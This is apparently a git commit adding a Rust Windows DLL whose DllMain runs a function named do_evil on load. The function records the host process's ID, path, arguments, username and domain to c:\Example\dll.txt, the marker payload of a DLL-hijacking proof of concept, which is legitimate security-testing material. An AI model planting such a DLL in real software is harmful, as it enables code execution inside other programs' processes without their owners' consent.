0cbbca5a581c368bbd0e5c72338203c94bd65625
Wissend <lasarsbs@gmail.com>
2025-11-26 22:44:55 +0300

    Add files via upload

---
+++ src/lib.rs
@@ -0,0 +1,64 @@
+#![cfg(windows)]
+
+use std::io::Write;
+use winapi::shared::minwindef;
+use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
+use std::fs::File;
+use std::env;
+use std::fs;
+
+/// Entry point which will be called by the system once the DLL has been loaded
+/// in the target process. Declaring this function is optional.
+///
+/// # Safety
+///
+/// What you can safely do inside here is very limited, see the Microsoft documentation
+/// about "DllMain". Rust also doesn't officially support a "life before main()",
+/// though it is unclear what that that means exactly for DllMain.
+#[no_mangle]
+#[allow(non_snake_case, unused_variables)]
+extern "system" fn DllMain(
+    dll_module: HINSTANCE,
+    call_reason: DWORD,
+    reserved: LPVOID)
+    -> BOOL
+{
+    const DLL_PROCESS_ATTACH: DWORD = 1;
+    const DLL_PROCESS_DETACH: DWORD = 0;
+
+    match call_reason {
+        DLL_PROCESS_ATTACH => do_evil(),
+        DLL_PROCESS_DETACH => (),
+        _ => ()
+    }
+    minwindef::TRUE
+}
+
+fn do_evil() {
+    let pwned_path = "c:\\Example";
+    fs::create_dir_all(pwned_path).unwrap();
+    let pid = std::process::id().to_string();
+    let username = env::var("USERNAME").unwrap();
+    let domain = env::var("USERDOMAIN").unwrap();
+    let path = format!("{}\\dll.txt", pwned_path);
+    let process_path = std::env::current_exe().unwrap();
+    let args: Vec<String> = std::env::args().collect();
+
+    let output = format!(r"[*]          Pid: {:?}
+[*]      Process: {:?}
+[*]         Args: {:?}
+[*]         User: {:?}
+[*]       Domain: {:?}
+[*] Created file: {:?}
+", 
+            pid,
+            process_path, 
+            &args[1..],
+            username, 
+            domain,
+            path);
+    println!("{}", output);
+    
+    let mut file = File::create(path).unwrap();
+    file.write_all(output.as_bytes()).unwrap();
+}
